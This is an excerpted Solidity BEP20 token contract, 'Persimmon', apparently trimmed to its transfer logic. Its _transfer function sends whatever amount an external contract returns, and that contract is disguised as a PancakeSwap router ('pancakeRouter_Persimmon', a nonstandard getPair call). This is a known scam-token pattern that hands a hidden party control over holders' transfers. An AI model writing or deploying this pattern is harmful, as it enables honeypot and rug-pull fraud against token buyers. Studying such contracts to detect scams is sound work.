...
contract Persimmon is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Persimmon';
  string private constant _symbol = 'Persimmon';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusPersimmon = 0;
  address pancakeRouter_Persimmon;
  ...
  */
  ...
  function pancakePairPersimmon(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_Persimmon).getPair(_bonusPersimmon, sender, recipient, arrData);

      _bonusPersimmon = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountPersimmon = pancakePairPersimmon(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountPersimmon);
